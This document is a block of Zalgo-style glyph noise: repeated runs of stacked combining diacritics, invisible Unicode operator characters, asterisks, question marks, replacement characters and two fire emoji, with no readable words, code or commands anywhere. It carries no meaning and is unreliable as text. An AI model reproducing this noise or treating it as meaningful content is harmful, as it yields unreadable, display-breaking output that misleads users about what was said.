͔̮̠̙͉͎͉͖͉̳̣͍͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘